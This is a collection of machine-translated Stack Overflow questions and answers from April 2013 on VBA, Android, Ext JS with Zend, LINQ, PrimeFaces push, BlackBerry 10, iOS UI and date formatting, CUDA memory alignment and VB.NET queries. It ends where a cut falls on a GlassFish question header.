# excel - VBA Excel中基于列标题的动态列选择

> ID：16013717
> 
> 赞同：3
> 
> 时间：2013-04-15T11:12:09.307
> 
> 标签：excel, vba

我有以下代码可以根据标题选择一列。

```
Dim rng1 As Range
Set rng1 = Range(Range("A1:Z1").Find("Name"), Range("A1:Z1").Find("Name").End(xlDown)) 
```

尝试使用此范围并在图表上设置 XValue 时

```
ActiveChart.SeriesCollection(5).XValues = rng1 
```

我看到标题也出现在列表中。

想知道一种基于标题选择列然后从中删除标题元素的方法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T11:24:12.960

尝试这个

```
Set rng1 = Range( _
                 Range("A1:Z1").Find("Name").Offset(1), _
                Range("A1:Z1").Find("Name").Offset(1).End(xlDown)) 
```

不过要注意一点。`xlDown`如果从第 2 行开始没有数据，可能会给您带来意想不到的结果。如果找不到名称，您所采用的方法也会给您一个错误。

话虽如此，这是一个替代方案

```
Sub Sample()
    Dim ws As Worksheet
    Dim lRow As Long
    Dim aCell As Range, rng1 As Range

    '~~> Set this to the relevant worksheet
    Set ws = ThisWorkbook.Sheets("Sheet1")

    With ws
        '~~> Find the cell which has the name
        Set aCell = .Range("A1:Z1").Find("Name")

        '~~> If the cell is found
        If Not aCell Is Nothing Then
            '~~> Get the last row in that column and check if the last row is > 1
            lRow = .Range(Split(.Cells(, aCell.Column).Address, "$")(1) & .Rows.Count).End(xlUp).Row

            If lRow > 1 Then
                '~~> Set your Range
                Set rng1 = .Range(aCell.Offset(1), .Cells(lRow, aCell.Column))

                '~~> This will give you the address
                Debug.Print rng1.Address
            End If
        End If
    End With
End Sub 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-09-18T16:17:08.463

只是对 Siddharth's Answer 的修订（非常好）。此代码将遍历指定工作表中的所有行，直到找到具有指定列标题的行：

```
Sub Sample()
Dim ws As Worksheet
Dim lRow As Long
Dim aCell As Range, rng1 As Range
Dim i As Integer

'~~> Set this to the relevant worksheet
Set ws = ThisWorkbook.Sheets("Sheet1")
i = 1

'Iterate through the rows until the target name is found
    For i = 1 To ActiveSheet.UsedRange.Rows.Count
        With ws
            '~~> Find the cell which has the name - build range with current iterator
            Set aCell = .Range("A" & i & ":Z" & i).Find("Name")

            '~~> If the cell is found
            If Not aCell Is Nothing Then
                'Set iterator equal to rows to satisfy For...Next
                i = ActiveSheet.UsedRange.Rows.Count
                 '~~> Get the last row in that column and check if the last row is > 1
                lRow = .Range(Split(.Cells(, aCell.Column).Address, "$")(1) & .Rows.Count).End(xlUp).Row

                If lRow > 1 Then
                    '~~> Set your Range
                    Set rng1 = .Range(aCell.Offset(1), .Cells(lRow, aCell.Column))

                    '~~> This will give you the address
                    Debug.Print rng1.Address
                End If
            End If
        End With
    Next i
End Sub 
```

只是想稍微改进以前的答案！这工作得很好。

# android - 像 Google Play 一样通过无线方式静默安装 Android 应用程序

> ID：16013719
> 
> 赞同：-3
> 
> 时间：2013-04-15T11:12:10.850
> 
> 标签：android, android-install-apk, device-admin

我需要在没有任何用户提示的情况下安装 apk 文件，就像 Google PlayStore 一样。我知道这个问题已经被问过很多次了，但我仍然没有找到任何可解决的答案。我只是从我的 sdcard 安装应用程序，我尝试了以下方式，

```
public void getInstall(Context context) {

        File file = new File(Environment.getExternalStorageDirectory()
                + "/Demo.apk");
        Uri mPackageURI = Uri.fromFile(file);

        ApplicationManager appMgr = null;

        try {
            appMgr = new ApplicationManager(context);
        } catch (SecurityException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        } catch (NoSuchMethodException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }

        int installFlags = 1;
        PackageManager pm = context.getPackageManager();

        Method method = null;

        try {
            method = pm.getClass().getMethod(
                    "installPackage",
                    new Class[] { android.net.Uri.class,
                            android.content.pm.IPackageInstallObserver.class,
                            Integer.TYPE, String.class });
        } catch (SecurityException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }

        String installerPackageName = "com.myapp.demo";
        PackageInstallObserver observer = appMgr.new PackageInstallObserver();

        try {

            method.invoke(pm, new Object[] { mPackageURI, observer,
                    installFlags, installerPackageName });

        } catch (IllegalArgumentException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    } 
```

`Neither user 10057 nor current process has android.permission.INSTALL_PACKAGES`但是即使我在清单文件中添加了此权限，我也会收到错误消息。

**我的设备没有植根，我希望它不生根**，在许多答案中，我发现根据安全原因，他们不允许这样做是不可能的，但如果可以使用 PlayStore 和[AndroidLost](https://play.google.com/store/apps/details?id=com.androidlost&feature=search_result#?t=W251bGwsMSwxLDEsImNvbS5hbmRyb2lkbG9zdCJd)应用程序，那么为什么不使用我们呢？

如果可能的话，我需要帮助！

谢谢，

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-15T11:14:34.360

> 我的设备没有植根，我希望它不生根

对于第三方应用程序，这在 Android 上是不可能的。Google Play 能够做到这一点，因为它安装到`/system/app`而不是`/data/app`. 如果您可以说服任何 OEM 或 ROM 制造商将您的应用程序放在系统分区上，则可以使用该`INSTALL_PACKAGES`权限，因为该权限仅授予系统应用程序。

无论如何，这是一个Android反模式。如果允许您在未经用户同意的情况下任意安装应用程序，这将是一个严重的安全漏洞，用户将不再负责设备。

# php - 使用 PHP（Zend 框架）进行 Ext JS 翻译

> ID：16013723
> 
> 赞同：2
> 
> 时间：2013-04-15T11:12:31.990
> 
> 标签：php, zend-framework, extjs, extjs4, translation

**翻译提示 1**：

我遇到了一个问题，我需要为其他国家的客户翻译我的应用程序。我在应用程序中的所有自定义字符串都没有包含在 Ext JS 的语言环境文件中，所以我必须想出自己的翻译方式。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T14:15:30.643

You might want to consider using a gettext javascript plugin for the frontend, such as Jed. [http://slexaxton.github.io/Jed/](http://slexaxton.github.io/Jed/). That would mean you can keep using gettext dictionaries for your entire app.

I ended up creating a `core.po` dictionary, which contains all the backend strings, and a `frontend.po` dictionary which is dedicated to the frontend.

You can generate an output that is suitable for jed plugin by using a simple conteoller. I open sourced some sections of the work I did while implementing it. see [https://github.com/aporat/zend-translate-skelton/blob/master/library/TranslateGettext/BackendProxyController.php](https://github.com/aporat/zend-translate-skelton/blob/master/library/TranslateGettext/BackendProxyController.php)

The controller generates a Jed gettext dictionary, and this javascript is included in the layout.phtml

```
<script src="/language?language=en"></script> 
```

Controller:

```
<?php

  class TranslateGettext_BackendProxyController extends Zend_Controller_Action
  {

    /**
     * See http://slexaxton.github.com/Jed/
     * This is a json proxy for the frontend i18n
     */
    public function indexAction()
    {

        $localeCode = $this->_getParam('locale');
        $locale = new Zend_Locale($localeCode);

        $translate = Zend_Registry::get('Zend_Translate');

        if ($translate->isAvailable($locale->getLanguage())) {
            $entries = Gettext\Extractors\Po::extract(APPLICATION_PATH . '/../languages/' . $locale->getLanguage() . '/LC_MESSAGES/frontend.po');
        } else {
            $entries = Gettext\Extractors\Po::extract(APPLICATION_PATH . '/../languages/en/LC_MESSAGES/frontend.po');
        }

        echo 'var i18n = new Jed({locale_data : ';
        echo Gettext\Generators\Jed::generate($entries, true);
        echo '});';

        exit;
    }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T14:18:44.083

在我的应用程序中，我使用 mo/po 文件来处理服务器端的翻译。由于我想将所有语言字符串保存在一个中心位置（我的 .po 文件），因此我使用了“Language.js”文件而不是“English.js”和“French.js”。该文件的内容如下所示：

```
window.applanguage = {
    /*General form elements*/
    login : <?=$this->translate("Login")?>,
    OK: <?=$this->translate("OK")?>,
    changepassword: <?=$this->translate("Change password")?>,
    currentpassword: <?=$this->translate("Current password")?>,
    sam: <?=$this->translate("System Access Manager")?>,
    userid: <?=$this->translate("User ID")?>,
    adminid: <?=$this->translate("Admin ID")?>,
    email: <?=$this->translate("Email")?>,
    password: <?=$this->translate("Password")?>,
    newpassword: <?=$this->translate("New password")?>,
    confirmpassword: <?=$this->translate("Confirm password")?>,
    confirm: <?=$this->translate("Confirm")?>,
    confirmation: <?=$this->translate("Confirmation")?>,
    wentwrong: <?=$this->translate("Something went wrong")?>,
    username: <?=$this->translate("Username")?>,
    passvalidity: <?=$this->translate("Password Validity (days)")?>,
    product: <?=$this->translate("Product")?>,
    accesslevel: <?=$this->translate("Access Level")?>,
    timeoutmins: <?=$this->translate("Timeout (mins)")?>,
    cancel: <?=$this->translate("Cancel")?>,
    save: <?=$this->translate("Save")?>,
    reset: <?=$this->translate("Reset")?>,
    passwordutility: <?=$this->translate("Change password utility")?>,
    expireform: <?=$this->translate("Session expired, please log in to continue.")?>,
    adduser: <?=$this->translate("Add user")?>,
    edituser: <?=$this->translate("Edit user")?>,
    removeuser: <?=$this->translate("Remove user")?>,
    resetuser: <?=$this->translate("Reset user")?>,
    add: <?=$this->translate("Add")?>
}; 
```

这样，我将所有翻译保存在同一个位置，并且 poedit 可以处理文件以建议需要翻译的字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:12:31.990

我决定在名为“resources”的文件夹中创建一个“English.js”文件（尽管您可以将其称为“locale”或任何您想要的名称）。在这个文件中，我创建了一个对象，其中包含需要翻译的所有自定义字符串，如下所示：

```
window.applanguage = {
    /*General form elements*/
    login : "Login",
    OK: "OK",
    changepassword: "Change password",
    currentpassword: "Current password",
    sam: "System Access Manager",
    userid: "User ID",
    adminid: "Admin ID",
    email: "Email",
    password: "Password",
    newpassword: "New password",
    confirmpassword: "Confirm password",
    confirm: "Confirm",
    confirmation: "Confirmation",
    wentwrong: "Something went wrong",
    username: "Username",
    passvalidity: "Password Validity (days)",
    product: "Product",
    accesslevel: "Access Level",
    timeoutmins: "Timeout (mins)",
    cancel: "Cancel",
    save: "Save",
    reset: "Reset",
    passwordutility: "Change password utility",
    expireform: "Session expired, please log in to continue.",
    adduser: "Add user",
    edituser: "Edit user",
    removeuser: "Remove user",
    resetuser: "Reset user",
    add: "Add"
}; 
```

无论我在哪里需要翻译自定义字符串，我都将其替换为`window.applanguage.string_to_translate`. IE：

```
Ext.Msg.show({
    closable: false,
    title: window.applanguage.info,
    msg: window.applanguage.selectuserfirst,
    buttons: Ext.Msg.OK,
    icon: Ext.Msg.INFO
}); 
```

现在，如果您希望您的应用程序使用法语（尽管这样做很乏味），您可以复制“English.js”文件，名称为“French,js”，然后将所有字符串更改为法语。

**注意**：不要忘记在`<header>`您的网络文件中包含您的语言文件。您可以通过在 PHP 中使用您想要显示的语言（我在 ZF application.ini 文件中设置我的）来动态更改此设置，然后在您的标题中您可以使用以下行：

`<script type="text/javascript" src="../extjs/resources/<?php echo $languageFile; ?>.js"></script>`

**翻译提示 2**：

如果您需要将所有 Ext JS 组件翻译成英语以外的语言，您可以在`header`. 例如，如果你想要法语： `<script type="text/javascript" src="../ext-4.2.0/locale/ext-lang-fr.js"></script>`

使用动态 PHP 选项，它看起来像这样（这适用于 ZF，但您可以在您的应用程序中使用全局变量）：

```
// get params from application.ini
$config = new Zend_Config_Ini('../application/configs/application.ini', 'development');
$langFile = $config->tranlation->language->file;
$extLang = null;
switch($langFile){
    case 'English':
        $extLang= "ext-lang-en_GB";
        break;
    case 'French':
        $extLang= "ext-lang-fr";
        break;
    case 'Spanish':
        $extLang= "ext-lang-es";
        break;
    case 'German':
        $extLang= "ext-lang-de";
        break;
    case 'Chinese (Simplified)':
        $extLang= "ext-lang-zh_CN";
        break;
    case 'Chinese (Traditional)':
        $extLang= "ext-lang-zh_TW";
        break;
} 
```

然后在你的`<header>`位置： `<script type="text/javascript" src="../ext-4.2.0/locale/<?php echo $extLang; ?>.js"></script>`

# linq - Linq 查询优化和方法语法等效

> ID：16013730
> 
> 赞同：0
> 
> 时间：2013-04-15T11:13:03.680
> 
> 标签：linq, entity-framework, postgresql-9.2, npgsql

我有这两个查询：

1.  第一个得到一个不同的标识符列表。
2.  第二个过滤这些 id 的结果。

    ```
     var query = (from bk in context.BookKeeping
                     join bk12 in context.BookKeeping on bk.LetteringId equals bk12.LetteringId 
                     into bk11
                     from bk1 in bk11.DefaultIfEmpty()
                     join bi2 in context.BillingInformation on bk1.BillingInformationId equals bi2.BillId 
                     into bi1
                     from bi in bi1.DefaultIfEmpty()
                     where bk.LetteringId != null && bk.PaymentId != null && bk1.LetteringId != null
                     select bk.PaymentId).Distinct();

        var query2 = from m in context.Movement
                     join p2 in context.Payment on m.PaymentId equals p2.Id
                     into p1
                     from p in p1.DefaultIfEmpty()
                     join pm2 in context.PaymentMode on p.PaymentModeId equals pm2.Id
                     into pm1
                     from pm in pm1.DefaultIfEmpty()
                     from ids in query
                     where ids.Value == p.Id
                     select m; 
    ```

第二个查询的有趣部分如下：

```
 from ids in query
                 where ids.Value == p.Id 
```

我想知道我是否可以使它更紧凑，以及如何使用方法语法有条件地过滤 ids 列表。我知道我必须使用**SelectMany**但不知道如何选择正确的重载。

TIA。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-26T11:43:57.143

我找到了解决方案：

```
var query2 = context.Movement.SelectMany(m => query1, (m, ids) => new { m, ids })
    .Where(a => a.m.PaymentId == a.ids).Select(a => a.m); 
```

我必须说第一个lamba的语法一开始很奇怪！

# java - 如何通过推送 primeFaces 来刷新 dataTable

> ID：16013736
> 
> 赞同：5
> 
> 时间：2013-04-15T11:13:19.943
> 
> 标签：java, jsf-2, primefaces

我需要知道如何在 index2.xhtml 中
使用 push 更改数据时更新 index1.xhtml 中的 DataTable ...我在 index1.xhtml 中定义套接字，如下所示：

```
<p:socket channel="/table" onMessage="handle"/> 
```

在 bean 中：

```
public void contract(){
 ....
PushContext pcont=PushContextFactory.getDefault().getPushContext();
pcont.push("/table",something);
} 
```

我不知道的是如何在 javaScript 中更新 dataTable：

```
<script type="text/javascript">
  function handle() {
          ???
        }
</script> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-12-04T11:51:11.830

这是一个没有 jQ 技巧的更好的解决方案：

```
<p:socket channel="/table" >
    <p:ajax event="message" update=":datatable" />
</p:socket> 
```

如果您不想丢失过滤器，这是一个更好的解决方案：

```
<p:socket channel="/table" >
    <p:ajax event="message" oncomplete="PF('datatableWidgetVar').filter()" />
</p:socket> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-16T15:27:11.137

这是我的简单测试，当 2.xhtml 中的 soclet 从服务器接收到事件时，它会触发点击事件到命令按钮，并且这个命令按钮（你可以不可见）将更新你想要的目标： Bean：

```
@ManagedBean(name = "globalCounter")
@SessionScoped // option
public class GlobalCounterBean implements Serializable {

    private static final long serialVersionUID = 1L;
    private int count;
    public int getCount() {
        return count;
    }
    public void setCount(int count) {
        this.count = count;
    }
    public void increment() {
        count++;
        PushContext pushContext = PushContextFactory.getDefault().getPushContext();
        pushContext.push("/counter", String.valueOf(count));
    }
} 
```

1.xhtml：

```
 <h:body>       
        <h:form id="form">  
            <h:outputText id="out" value="#{globalCounter.count}" styleClass="ui-widget display" />  
        </h:form>  
        <p:socket  onMessage="handleMessage" channel="/counter" />             
    </h:body> 
```

2.xhtml：

```
<h:form id="form">  
            <h:outputText id="out" value="#{globalCounter.count}" styleClass="ui-widget display" />  
            <br />  
            <p:commandButton onclick="alert('test')" id="btn" process="@form" value="Click" update="@parent" />  
        </h:form>  

        <p:socket  onMessage="handleMessage" channel="/counter" />  
        <script type="text/javascript">  
            function handleMessage(data) { 
                $('#form\\:btn').click();    
            }  
        </script> 
```

# blackberry-10 - 如何将 BlackBerry10 Dev Alpha B 连接到 QNX Momentics

> ID：16013742
> 
> 赞同：0
> 
> 时间：2013-04-15T11:13:38.777
> 
> 标签：blackberry-10, qnx, blackberry-qnx

如何将 BlackBerry 10 Dev Alpha B 设备连接到 QNX Momentics？

我试图将它与

窗口 > 首选项。展开 BlackBerry，然后选择签名。单击 BlackBerry 部署设置向导。

当我到达 QNX Momentics 应该检测到我的设备 IP 地址的部分时，它失败了，它找不到设备的 IP 地址。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:38:23.280

您需要确保将设备设置为开发模式。您可以在设置-> 安全下找到它。

我不确定它是否已针对最新版本修复，但请注意，有时在进入睡眠模式或重新启动后，您可能需要再次打开开发模式。

编辑（感谢 Naskov）：同时安装设备提供安装的 BlackBerry10 驱动程序。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T13:31:21.117

除了 Hyarion 的答案之外，它还可以在 Settings->Storage and Access 下进行，并根据您使用的内容设置“连接到 Windows”/“连接到 Mac”。我发现这比让设备自动检测您拥有的计算机类型更好。

# uiview - 在 UITableView 中编辑的情况下突出显示TextColor

> ID：16013744
> 
> 赞同：1
> 
> 时间：2013-04-15T11:13:42.450
> 
> 标签：uiview, uitableview, highlighting

我有一个`UITableView`自定义单元格，其中包含一些标签`highlightedTextColor`：

`myLabel.highlightedTextColor = [UIColor whiteColor];`

这工作正常，直到我决定使用以下方法使我的表可编辑：

`self.navigationItem.rightBarButtonItem = self.editButtonItem`

当我单击“编辑”按钮并单击一个单元格时，我发现该`highlightedTextColor`属性不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T16:48:31.617

你确定单元格被选中了吗？尝试`allowsSelectionDuringEditing = YES`在`UITableView`.

另外，你的意思是使用`[UIColor whiteColor]`？

# objective-c - 如何在 iPad 中使用删除按钮将图像显示为单行水平网格视图

> ID：16013754
> 
> 赞同：0
> 
> 时间：2013-04-15T11:14:18.783
> 
> 标签：objective-c, gridview, uiimage, ipad

大家好，

> 我正在做一个项目，我的要求是显示具有删除功能的图像，如下图所示。我已经浏览了许多网格视图示例，例如 GMGridView、AQGridView 等，但我找不到解决方案。所以请帮我建立以下功能

谢谢，

![描述在这里](https://i.stack.imgur.com/MoXwo.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:20:09.347

您可以使用[UICollectionView](http://developer.apple.com/library/ios/#documentation/uikit/reference/UICollectionViewLayout_class/Reference/Reference.html)像这样创建 UIControl。使用[UICollectionViewFlowLayout](http://developer.apple.com/library/ios/#documentation/uikit/reference/UICollectionViewFlowLayout_class/Reference/Reference.html#//apple_ref/occ/cl/UICollectionViewFlowLayout)和 collectionview 你可以实现这个结构。

UICollectionview 外面有很多教程，你可以从那里学习

一些链接是

[http://www.techotopia.com/index.php/An_Overview_of_iOS_6_Collection_View_and_Flow_Layout](http://www.techotopia.com/index.php/An_Overview_of_iOS_6_Collection_View_and_Flow_Layout)

[http://adoptioncurve.net/archives/2012/09/a-simple-uicollectionview-tutorial/](http://adoptioncurve.net/archives/2012/09/a-simple-uicollectionview-tutorial/)

# vb.net - 'System.Linq.IQueryable(Of Integer)' 无法转换为 Integer

> ID：16013755
> 
> 赞同：0
> 
> 时间：2013-04-15T11:14:19.657
> 
> 标签：vb.net, linq, integer, type-conversion

我需要在表之间移动数据。这两个表在每个字段的数据类型方面是相同的。但是，当我尝试从一个表中获取数据并将其放在另一个表中时，我得到了错误。毫无疑问，这是一种非常复杂的编程方式，但这是我现阶段所知道的唯一方式。对于我获得`Value of type 'System.Linq.IQueryable(Of Integer)' cannot be converted to Integer`的每个字段或等效字段，具体取决于数据类型。我已经为此苦苦挣扎了 3 天。请帮忙！

```
 `input string`
    Dim parseRef As String = txtReferenceCode.Text

    `Convert string to integer value`
    Dim findRecord As Integer = Integer.Parse(parseRef)

    `Query the database for the row to be updated.`
    Dim modQuery = _
        (From m In db.Modules
         Join am In db.Amendments_Awaiting_Approvals On m.Module_code Equals am.Module_code
         Where am.Amendments_ID = findRecord _
         Select m)

    Dim newName = (From n In db.Amendments_Awaiting_Approvals
                   Where n.Amendments_ID = findRecord
                   Select n.Module_name_app)

    Dim newStatus = (From n In db.Amendments_Awaiting_Approvals
                  Where n.Amendments_ID = findRecord
                  Select n.Module_status_app)

    Dim newCredits = (From n In db.Amendments_Awaiting_Approvals
                  Where n.Amendments_ID = findRecord
                  Select n.Module_credits_app)

    Dim newCapacity = (From n In db.Amendments_Awaiting_Approvals
                          Where n.Amendments_ID = findRecord
                          Select n.Module_capacity_app)

    Dim newFee = (From n In db.Amendments_Awaiting_Approvals
                  Where n.Amendments_ID = findRecord
                  Select n.Fee_change)

    Dim newDesc = (From n In db.Amendments_Awaiting_Approvals
                  Where n.Amendments_ID = findRecord
                  Select n.Module_Description_app)

    ` Execute the query, and change the column values
     you want to change.  NB all fields on right had side hold the temp data to be input`
    For Each m As [Module] In modQuery
        m.Module_name = newName
        m.Module_status = newStatus
        m.Module_credits = newCredits
        m.Module_capacity = newCapacity
        m.Fee = newFee
        m.Module_Description = newDesc 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T11:18:19.023

如果您希望每个查询只有一行；

```
Dim newFee = (From n In db.Amendments_Awaiting_Approvals
              Where n.Amendments_ID = findRecord
              Select n.Fee_change) 
```

默认情况下，这将返回 Fee_change 的“列表”

```
Dim newFee = (From n In db.Amendments_Awaiting_Approvals
              Where n.Amendments_ID = findRecord
              Select n.Fee_change).FirstOrDefault 
```

添加 .FirstOrDefault 所以它不再是 iqueryable

# android - 从通知中打开 newInent 和 loadUrl

> ID：16013757
> 
> 赞同：1
> 
> 时间：2013-04-15T11:14:28.093
> 
> 标签：android, android-layout, android-intent, push-notification

好的，我快到了。我收到了通知，但想打开应用程序并在您单击通知时在我拥有的 web 视图中加载一个 URL。我拥有的代码如下。当我单击通知时，它会打开 webview 活动，但随后会崩溃并且不会加载页面。

这是我的通知

```
private void sendGCMIntent(final Context theContext, Intent theMsg) 
    {   
        int icon = R.drawable.noti_msg, count;
        long when = Calendar.getInstance().getTimeInMillis();

        String msg = theMsg.getStringExtra("message");
        String url = theMsg.getStringExtra("photo");
        count = Integer.parseInt(theMsg.getStringExtra("count"));
        Bitmap photo = getBitmapFromURL(url);
        String nameEncode = theMsg.getStringExtra("name");

        String theMessage = Html.fromHtml(msg).toString().replace("\\", "");
        String name = Html.fromHtml(nameEncode).toString();

        String title = theContext.getString(R.string.app_name);
        Uri soundUri = Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.msg);

        long[] vibraPattern = { 0, 500, 250, 500 };

        Intent notificationIntent = new Intent(theContext,MainActivity.class);
        notificationIntent.setData(Uri.parse("content://"+when));

        notificationIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        notificationIntent.addCategory("android.intent.category.LAUNCHER");
        PendingIntent contentIntent = PendingIntent.getActivity(theContext, 0, notificationIntent, PendingIntent.FLAG_CANCEL_CURRENT);

        NotificationManager notificationManager = (NotificationManager) theContext.getSystemService(Context.NOTIFICATION_SERVICE);

        NotificationCompat.Builder notification = new NotificationCompat.Builder(theContext);

        notification.setContentTitle(title);
        notification.setContentText("New message from: "+ name);
        notification.setSubText(theMessage);
        notification.setContentIntent(contentIntent);
        notification.setTicker("New message");
        notification.setNumber(count);
        notification.setSmallIcon(icon);
        notification.setLargeIcon(photo);
        notification.setAutoCancel(true);
        notification.setSound(soundUri);
        notification.setVibrate(vibraPattern);
        notification.setWhen(when);

        Notification notifies = notification.build();

        notificationManager.notify((int)when, notifies);    
    } 
```

在我的 MainActivity 我有这个

```
 @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        if(intent.getStringExtra("type").equals("message"))
        {
           String mUrl = intent.getStringExtra("mid");
           webView.loadUrl(mUrl);
        }
    } 
```

这是日志错误

```
04-15 07:33:41.061: E/AndroidRuntime(19851): FATAL EXCEPTION: main
04-15 07:33:41.061: E/AndroidRuntime(19851): java.lang.NullPointerException
04-15 07:33:41.061: E/AndroidRuntime(19851):    at me.site.test.MainActivity.onNewIntent(MainActivity.java:230)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at android.app.Instrumentation.callActivityOnNewIntent(Instrumentation.java:1168)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at android.app.ActivityThread.deliverNewIntents(ActivityThread.java:2181)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at android.app.ActivityThread.performNewIntents(ActivityThread.java:2194)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at android.app.ActivityThread.handleNewIntent(ActivityThread.java:2203)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at android.app.ActivityThread.access$1500(ActivityThread.java:139)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1295)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at android.os.Handler.dispatchMessage(Handler.java:99)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at android.os.Looper.loop(Looper.java:137)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at android.app.ActivityThread.main(ActivityThread.java:4918)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at java.lang.reflect.Method.invokeNative(Native Method)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at java.lang.reflect.Method.invoke(Method.java:511)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:1004)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:771)
04-15 07:33:41.061: E/AndroidRuntime(19851):    at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-15T11:24:10.567

您的问题是您正在从您的意图中读取 String Extra，但您从未在`notificationIntent`.

我怀疑您在`NullPointerException`以下行中得到了一个：

```
if(intent.getStringExtra("type").equals("message")) 
```

你真的需要打电话：

```
notificationIntent.putExtra( "type", "message" );
notificationIntent.putExtra( "mid", /* some String value */ ); 
```

在你的`sendGCMIntent`方法中。

# visual-studio-2008 - float4 未对齐访问？调试工作，发布不

> ID：16013758
> 
> 赞同：0
> 
> 时间：2013-04-15T11:14:30.960
> 
> 标签：visual-studio-2008, cuda

环境：Cuda 5.0、GTX 480、windows 7 x64、VS2008

好的，首先，让我知道这是否合法：

```
//this code isnt actually the real code I have on my app
do_something(float *vector) {

   float4 myvar = *(float4*)&vector[threadIdx.x]; //missalignment issues??

} 
```

我有一些复杂的内核，在类似的代码上我得到了奇怪的行为。每个线程必须获取 4 个连续的浮点数，我认为在单个事务中获取它们会更好。所以我尝试将它们作为单个 float4 访问...

编译器不会抱怨，memchecker 也不会出错。在调试模式下运行它似乎有效（不确定，无法测试结果）。但在发布模式下，它会给出“未知错误”。看来，如果我尝试访问 float4，我必须将其与 128B 对齐，这是正确的吗？如果是，为什么 memchecker 不抱怨？为什么它在调试时有效而在发布时无效？

顺便说一句，如果我执行 4 个事务来执行操作（一次浮动一个），它就可以工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T13:18:54.103

[来自关于全局大小和对齐要求](http://docs.nvidia.com/cuda/cuda-c-programming-guide/index.html#device-memory-accesses)的 CUDA C 编程指南

> 全局内存指令支持读取或写入大小等于 1、2、4、8 或 16 字节的字。当且仅当数据类型的大小为 1、2、4、8 或 16 字节并且数据自然为对齐（即，它的地址是该大小的倍数）。

float4 的自然对齐方式是 128 位，因此您的访问必须与 128 位对齐。

计算能力 2.0 及更高版本的设备在未对齐访问时会抛出硬件异常。计算能力 1.* 设备将返回不正确的结果。

# ios - 如何为日期结构“2014-04-01T13:30:00.000+0000”设置日期格式化程序

> ID：16013763
> 
> 赞同：3
> 
> 时间：2013-04-15T11:14:47.887
> 
> 标签：ios, objective-c, nsstring, nsdate, nsdateformatter

我是目标 C 的新手。我想设置一个日期格式化程序，用于将日期“2014-04-01T13:30:00.000+0000”转换为另一种格式 - “2014/04/01 13:30:00 AM”。

我已经尝试了许多格式，但它不起作用。请帮助解决这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:24:21.980

尝试这个

```
NSString *dateFormat1 = @"yyyy-MM-dd'T'HH:mm:ss.sssZ";
NSString *dateFormat2 = @"yyyy/MM/dd HH:mm:ss a";

NSString *dateString = @"2014-04-01T13:30:00.000+0000";

NSDateFormatter *dateFormatter = [[NSDateFormatter alloc]init];
NSLocale *enUSPOSIXLocale = [[NSLocale alloc] initWithLocaleIdentifier:@"en_US_POSIX"];
[dateFormatter setLocale:enUSPOSIXLocale];
[dateFormatter setDateFormat:dateFormat1];

NSDate *date = [dateFormatter dateFromString:dateString];
[dateFormatter setDateFormat:dateFormat2];
dateString = [dateFormatter stringFromDate:date];

NSLog(@"Date : %@",dateString); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:31:53.373

使用以下格式，将工作... :)

```
NSDateFormatter *df = [[NSDateFormatter alloc] init];
[df setDateFormat:@"yyyy-MM-dd'T'HH:mm:ss.sssZ"];
NSDate *date = [df dateFromString:str];
NSLog(@"%@",date); 
```

[有关更多参考，请参阅此。](http://iphonesdkhelps.blogspot.in/2009/06/date-from-string-and-vice-versa.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-15T11:29:41.523

这段代码对我很有效，并且认为对你也有效..

```
NSDate *today = [NSDate date];
 NSDateFormatter *dateFormat = [[NSDateFormatter alloc] init];
 [dateFormat setDateFormat:@"yyyy/MM/dd hh:mm:ss a"];
 NSString *dateString = [dateFormat stringFromDate:today];
 NSLog(@"date: %@", dateString);
 [dateFormat release]; 
```

如果它不适合你..随时问..只是评论..

# eclipse - GlassFish Server 3.1.2 中的模块部署错误

> ID：16013764
> 
> 赞同：0
> 
> 时间：2013-04-15T11:14:47.747
